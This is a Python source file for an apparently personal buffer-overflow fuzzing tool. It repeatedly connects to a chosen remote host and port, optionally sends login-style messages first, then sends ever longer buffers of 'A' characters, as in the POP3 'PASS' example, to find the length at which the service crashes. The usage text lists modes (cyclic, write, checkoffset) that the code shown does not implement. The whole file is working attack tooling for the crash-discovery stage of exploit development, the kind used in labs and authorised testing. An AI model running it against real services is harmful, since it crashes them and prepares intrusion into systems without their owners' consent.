#!/usr/bin/python3
#
# ig-buffer-overflow.py
#
# Isabelle's generic buffer overflow tool
#
# https://github.com/isabellecda/cyber-scripts
#

import sys
import socket
import binascii
import os
import getopt

VERBOSE = False
DEFAULT_SOCKET_BUFF_SIZE = 1024
MAX_COUNT = 100

# Script usage
def print_usage(scriptName):
	print("Usage:")
	print(" {} --rhost=10.2.31.155 --rport=110 --buffhead='PASS ' --buffstep=200 --closecmd='QUIT' --interact='USER me' -v -f".format(scriptName))

	print("Parameters:")
	print("")
	print(" --help|-h	: Show script usage.")
	print(" --norec|-n	: Don't wait for receive message after connect.")
	print(" --mode|-m	: Select script mode (test|cyclic|write|checkoffset).")
	print(" --flush|-f	: Adds '\\r\\n' at the end of the payload.")
	print(" --rhost		: Remote host IP.")
	print(" --rport		: Remote host port.")
	print(" --buffstep	: Steps for buffsize increase in loop test. Default is 200.")
	print(" --buffhead	: Static buffer string set at the beginning of the buffer.")
	print("		 Is usually the crash string. Size is considered in buffSize calc.")
	print(" --closecmd	: Close command (optional).")
	print(" --interact	: Interact with the application before sending the payload. For each message in string (separated with ';;'), sends and receives response from app.")
	print("		 Example: --interact='login;;user' --> Sends 'login', gets response, sends 'user', gets response, and finally sends the generated payload")

# Main execution block ##################################################################
#########################################################################################

scriptName = sys.argv[0]

# Input parameters
try:
	opts, args = getopt.getopt(sys.argv[1:], "hnvfm:", ["help", "norec", "verbose", "flush", "rhost=", "rport=", "buffhead=", "buffstep=", "closecmd=", "interact="])
except getopt.GetoptError as err:
	print("Error:", err)
	print_usage(scriptName)
	sys.exit(1)	

# Default values
norec = False
flush = False

rhost = ""
rport = 0

buffstep = 200
buffHead = b''
closecmd = b''

interact = []

# Verify options
for opt, value in opts:
	if opt in ("-h", "--help"):
		print_usage(scriptName)
		sys.exit(1)	
	elif opt in ("-n", "--norec"):
		norec = True
	elif opt in ("-v", "--verbose"):
		VERBOSE = True
	elif opt in ("-f", "--flush"):
		flush = True
	elif opt == '--rhost':
		rhost = value
	elif opt == '--rport':
		rport = int(value)
	elif opt == '--buffhead':
		buffHead = str.encode(value)
	elif opt == '--buffstep':
		buffstep = int(value)
	elif opt == '--closecmd':
		closecmd = str.encode(value + "\r\n")
	elif opt == '--interact':
		interact = value.split(";;")
	else:
		print("Error: Unknown parameter")
		print_usage(scriptName)
		sys.exit(1)

print("Arguments: norec={} | rhost={} | rport={} | buffhead={} | buffstep={} | closecmd={} | interact={} | flush={}".format(norec, rhost, rport, buffHead, buffstep, closecmd, interact, flush)) if VERBOSE else None

# Mnimum params
if not rhost or not rport:
	print("Error: incorrect minimum number of params.")
	print_usage(scriptName)
	sys.exit(1);


# Loop test
for counter in range(1, MAX_COUNT):
	buffsize = (buffstep * counter) - len(buffHead)
	buff = b'A' * buffsize
	buffPayload = buffHead + buff


	print("") if VERBOSE else None

	# Create socket
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

	try:
		# Connect to rhost and rport
		connect = s.connect((rhost, rport))

		print("Testing payload with size:", buffstep * counter) if VERBOSE else None

		# Application connection return
		if not norec:
			r = s.recv(DEFAULT_SOCKET_BUFF_SIZE)	
			print(r) if VERBOSE else None

		# Interact with the application before sending the payload		
		for tValue in interact:
			tValue = tValue + "\r\n"
			interactValue = tValue.encode()	
			#print("App interaction, sending: [{}]".format(interactValue)) if VERBOSE else None
			s.send(interactValue)

			# Application payload return
			r = s.recv(DEFAULT_SOCKET_BUFF_SIZE)	
			print(r) if VERBOSE else None

		print(buffPayload) if VERBOSE else None

		if flush:
			buffPayload = buffPayload + "\r\n".encode()
	
		s.send(buffPayload)

		# Application payload return
		r = s.recv(DEFAULT_SOCKET_BUFF_SIZE)
		print(r) if VERBOSE else None
		
		if closecmd:
			#print("Close command: [{}]".format(closecmd)) if VERBOSE else None
			s.send(closecmd)

	except KeyboardInterrupt:
		print("Exit: Keyboard Interrupt")
		sys.exit(0)
	except:
		print("Error: Unexpected error.", sys.exc_info()[0])
		raise
	finally:
		s.close()

